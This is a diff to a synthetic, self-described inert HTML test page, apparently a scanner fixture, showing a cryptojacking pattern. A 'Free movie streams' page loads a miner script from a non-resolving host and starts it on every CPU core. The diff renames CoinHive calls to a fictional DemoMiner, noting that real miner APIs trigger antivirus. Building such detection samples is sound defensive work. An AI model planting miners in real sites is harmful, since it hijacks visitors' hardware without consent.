@@ -1,10 +1,11 @@
 <!-- PreFlight SYNTHETIC sample page. Inert: for testing and demos only. Attacker domains use the reserved .invalid ending and never resolve; commands only print a test message. -->
 <!doctype html><html lang="en"><head><meta charset="utf-8"><title>Free movie streams</title>
-<script src="https://miner-pool.invalid/coinhive.min.js"></script>
+<script src="https://miner-pool.invalid/demo-miner.min.js"></script>
 <script>
-// Inert: the library above never loads, so nothing is mined.
+// Inert: the library above never loads and DemoMiner is fictional, so nothing is mined.
+// It deliberately avoids real miner APIs, which antivirus software flags on sight.
 function startMining() {
-  var miner = new CoinHive.Anonymous('SYNTHETICSITEKEY0000', {throttle: 0.1});
+  var miner = new DemoMiner('SYNTHETICSITEKEY0000', {throttle: 0.1});
   miner.start();
   var workers = [];
   for (var i = 0; i < navigator.hardwareConcurrency; i++) { workers.push(new Worker('/m.js')); }
